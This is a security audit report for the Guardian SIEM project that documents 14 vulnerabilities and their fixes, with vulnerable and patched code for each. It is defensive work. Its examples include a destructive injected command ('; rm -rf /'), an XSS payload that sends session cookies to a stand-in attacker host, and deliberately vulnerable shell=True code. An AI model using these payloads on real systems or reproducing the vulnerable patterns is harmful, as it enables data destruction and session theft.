# Security Audit & Hardening Report

**Project:** Guardian SIEM v2.2  
**Audit Date:** February 16, 2026  
**Auditor:** Internal code review  
**Status:** ✅ All 14 vulnerabilities remediated  

---

## Summary

A comprehensive security audit was performed across the entire Guardian SIEM codebase. **14 vulnerabilities** were identified across 7 files, classified by severity:

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 CRITICAL | 2 | ✅ Fixed |
| 🟠 HIGH | 5 | ✅ Fixed |
| 🟡 MEDIUM | 5 | ✅ Fixed |
| 🔵 LOW | 2 | ✅ Fixed |

All 176 unit tests pass after remediation.

---

## Vulnerabilities Found & Fixed

### 🔴 CRITICAL-001 — Command Injection via `shell=True`

| Field | Value |
|-------|-------|
| **File** | `identity_verifier.py` |
| **CWE** | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — OS Command Injection |
| **CVSS** | 9.8 |

**Before:** User-supplied file paths were passed directly to `subprocess.check_output()` with `shell=True`, allowing arbitrary command execution via path manipulation (e.g., `; rm -rf /`).

```python
# VULNERABLE
output = subprocess.check_output(f'signtool verify /pa /v "{filepath}"', shell=True)
```

**Fix:** Replaced with `subprocess.run()` using list arguments (no shell), added strict path validation with a regex whitelist, and added a 15-second timeout.

```python
# FIXED
@staticmethod
def _validate_path(filepath):
    real = os.path.realpath(filepath)
    if not re.match(r'^[A-Za-z]:\\[\w\\\.\-\s]+$', real):
        raise ValueError(f"Invalid path characters: {real}")
    return real

result = subprocess.run(
    ["signtool", "verify", "/pa", "/v", validated_path],
    capture_output=True, text=True, timeout=15
)
```

---

### 🔴 CRITICAL-002 — Path Traversal in YARA Scan API

| Field | Value |
|-------|-------|
| **File** | `guardian_dash.py` — `/api/yara/scan` endpoint |
| **CWE** | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) — Path Traversal |
| **CVSS** | 9.1 |

**Before:** The YARA scan endpoint accepted a user-supplied `directory` parameter and passed it directly to the scanner, allowing scanning of arbitrary directories (e.g., `/etc/shadow`, `C:\Windows\System32`).

**Fix:** Added an `allowed_bases` whitelist. The real path of the requested directory must fall under one of the approved base directories (`service_logs/`, `logs/`).

```python
allowed_bases = [
    os.path.realpath(os.path.join(base_dir, "service_logs")),
    os.path.realpath(os.path.join(base_dir, "logs")),
]
real_dir = os.path.realpath(directory)
if not any(real_dir.startswith(b) for b in allowed_bases):
    return jsonify({"error": "Scan directory not allowed"}), 403
```

---

### 🟠 HIGH-001 — Hardcoded Flask Secret Key

| Field | Value |
|-------|-------|
| **File** | `guardian_dash.py` |
| **CWE** | [CWE-798](https://cwe.mitre.org/data/definitions/798.html) — Hardcoded Credentials |
| **CVSS** | 7.5 |

**Before:** `app.secret_key = "guardian-dev-key"` — anyone who reads the source code can forge session cookies.

**Fix:** Three-tier key resolution: environment variable → config file → cryptographically random fallback.

```python
app.secret_key = (
    os.environ.get("GUARDIAN_SECRET_KEY")
    or config.get("dashboard", {}).get("secret_key", "")
    or secrets.token_hex(32)
)
```

---

### 🟠 HIGH-002 — Hardcoded Default Admin Password

| Field | Value |
|-------|-------|
| **File** | `auth.py` — `_create_default_admin()` |
| **CWE** | [CWE-798](https://cwe.mitre.org/data/definitions/798.html) — Hardcoded Credentials |
| **CVSS** | 7.5 |

**Before:** Every installation started with `admin` / `guardian-admin` — easily guessable and documented in source.

**Fix:** Default admin password is now generated with `secrets.token_urlsafe(12)` and displayed once at startup. It cannot be recovered from source code.

---

### 🟠 HIGH-003 — Stored XSS in HTML Report Generators

| Field | Value |
|-------|-------|
| **Files** | `report_generator.py`, `incident_report.py`, `cloud_honeypot.py` |
| **CWE** | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Cross-Site Scripting |
| **CVSS** | 6.1 |

**Before:** Source IPs, hostnames, user agents, file paths, and other log-derived data were interpolated directly into HTML output via f-strings — no escaping. A malicious log entry like `<script>document.location='http://evil.com/steal?c='+document.cookie</script>` would execute when the report was opened.

**Fix:** All three report generators now import `html.escape` and wrap every user-controlled interpolation:

```python
from html import escape as esc

# Every dynamic value wrapped:
f'<td><code>{esc(str(ip))}</code></td>'
f'<strong>{esc(incident.title)}</strong>'
f'<td>{esc(str(ua["user_agent"]))}</td>'
```

---

### 🟠 HIGH-004 — WebSocket Authentication Bypass

| Field | Value |
|-------|-------|
| **File** | `guardian_dash.py` — WebSocket handler |
| **CWE** | [CWE-306](https://cwe.mitre.org/data/definitions/306.html) — Missing Authentication |
| **CVSS** | 7.5 |

**Before:** The WebSocket endpoint for live event streaming had no authentication check — any client could connect and receive the real-time feed even when auth was enabled.

**Fix:** Added session validation before accepting WebSocket connections:

```python
if app.config.get("AUTH_ENABLED"):
    ws_session = dict(session)
    if not ws_session.get("authenticated"):
        ws.close(reason=1008, message="Authentication required")
        return
```

---

### 🟡 MEDIUM-001 — Weak Password Hashing Fallback (SHA-256)

| Field | Value |
|-------|-------|
| **File** | `auth.py` — `_hash_password()` |
| **CWE** | [CWE-916](https://cwe.mitre.org/data/definitions/916.html) — Insufficient Password Hash Complexity |
| **CVSS** | 5.9 |

**Before:** When `bcrypt` was not installed, passwords were hashed with a single iteration of SHA-256 — trivially crackable with commodity hardware.

**Fix:** Fallback now uses `hashlib.pbkdf2_hmac("sha256", ..., 600_000)` — 600,000 iterations of PBKDF2, meeting OWASP 2024 recommendations. Legacy SHA-256 hashes are still verifiable (read-only) for backward compatibility.

---

### 🟡 MEDIUM-002 — EventBus Race Conditions

| Field | Value |
|-------|-------|
| **File** | `event_bus.py` |
| **CWE** | [CWE-362](https://cwe.mitre.org/data/definitions/362.html) — Race Condition |
| **CVSS** | 4.7 |

**Before:** `_subscribers.append()` and iteration over `_subscribers` in `emit()` were unprotected. Concurrent `subscribe()` + `emit()` calls could cause `RuntimeError: list modified during iteration` or silently miss callbacks.

**Fix:**
1. Added `_sub_lock` (threading.Lock) guarding all subscriber list mutations
2. `emit()` now snapshots the subscriber list under lock before iterating
3. Added `timeout=10` to `sqlite3.connect()` to prevent busy-database deadlocks

---

### 🟡 MEDIUM-003 — No Input Validation on API Endpoints

| Field | Value |
|-------|-------|
| **File** | `guardian_dash.py` — `/api/threat/<ip>`, `/api/geoip/<ip>`, `/api/response/block` |
| **CWE** | [CWE-20](https://cwe.mitre.org/data/definitions/20.html) — Improper Input Validation |
| **CVSS** | 5.3 |

**Before:** IP address parameters were passed directly to threat intel and GeoIP lookup functions without validation. Malformed input could trigger unexpected behavior in downstream APIs.

**Fix:** All three endpoints now validate input with `ipaddress.ip_address()` before processing:

```python
try:
    ipaddress.ip_address(ip)
except ValueError:
    return jsonify({"error": "Invalid IP address"}), 400
```

---

### 🟡 MEDIUM-004 — No Login Rate Limiting

| Field | Value |
|-------|-------|
| **File** | `auth.py` — `/login` route |
| **CWE** | [CWE-307](https://cwe.mitre.org/data/definitions/307.html) — Brute Force |
| **CVSS** | 5.3 |

**Before:** No limit on failed login attempts — automated brute-force attacks could run unrestricted.

**Fix:** Added per-IP rate limiting: 5 failed attempts per 5-minute sliding window. Returns HTTP 429 when exceeded. Counter resets on successful login.

---

### 🟡 MEDIUM-005 — YARA Stats Counter Race Condition

| Field | Value |
|-------|-------|
| **File** | `yara_scanner.py` |
| **CWE** | [CWE-362](https://cwe.mitre.org/data/definitions/362.html) — Race Condition |
| **CVSS** | 3.7 |

**Before:** `self._stats["files_scanned"] += 1` and similar increments were not atomic — concurrent scans from multiple threads could lose count updates.

**Fix:** Added `_stats_lock` (`threading.Lock`) wrapping all `_stats` reads and writes, including `get_stats()`.

---

### 🔵 LOW-001 — Debug Mode Hardcoded to `True`

| Field | Value |
|-------|-------|
| **File** | `guardian_dash.py` |
| **CWE** | [CWE-489](https://cwe.mitre.org/data/definitions/489.html) — Active Debug Code |
| **CVSS** | 3.1 |

**Before:** `app.run(debug=True)` was hardcoded — in production this exposes the Werkzeug interactive debugger, which allows arbitrary code execution.

**Fix:** Debug mode is now config-driven with a safe default:

```python
debug = config.get("dashboard", {}).get("debug", False)
app.run(host="0.0.0.0", port=5001, debug=debug)
```

---

### 🔵 LOW-002 — No Self-Delete or Last-Admin Protection

| Field | Value |
|-------|-------|
| **File** | `auth.py` — `delete_user()` |
| **CWE** | [CWE-284](https://cwe.mitre.org/data/definitions/284.html) — Improper Access Control |
| **CVSS** | 3.1 |

**Before:** An admin could delete their own account or the last remaining admin, locking everyone out of the system.

**Fix:** `delete_user()` now accepts a `requesting_user` parameter and enforces two guards:
1. Cannot delete your own account
2. Cannot delete the last admin account

---

## Reporting a Vulnerability

If you discover a security vulnerability in Guardian SIEM, please **do not** open a public issue. Instead, email the maintainer directly or open a private security advisory on GitHub.

We aim to acknowledge reports within 48 hours and publish fixes within 7 days for critical issues.

---

## Security Best Practices for Deployment

1. **Set `GUARDIAN_SECRET_KEY`** as an environment variable — don't rely on the random fallback
2. **Install `bcrypt`** (`pip install bcrypt`) for production-grade password hashing
3. **Change the default admin password** immediately after first run
4. **Run behind a reverse proxy** (nginx/Caddy) with TLS termination
5. **Set `debug: false`** in `config/config.yaml` (this is now the default)
6. **Restrict API keys** — rotate regularly, use role-based keys
7. **Use Docker secrets** for sensitive environment variables in production
